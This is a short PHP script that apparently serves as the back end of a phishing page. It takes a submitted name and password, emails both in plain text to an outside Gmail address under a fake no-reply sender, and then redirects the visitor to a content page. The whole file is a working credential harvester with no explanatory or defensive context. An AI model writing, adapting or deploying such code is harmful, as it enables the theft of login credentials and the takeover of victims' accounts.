<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']);
    $to = "hallo,titty2@gmail.com";
    $subject = "Form Submission";
    $message = "Name: $name\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        header("Location: content.html");
        exit();
    } else {
        echo "Failed to send email.";
    }
}
?>
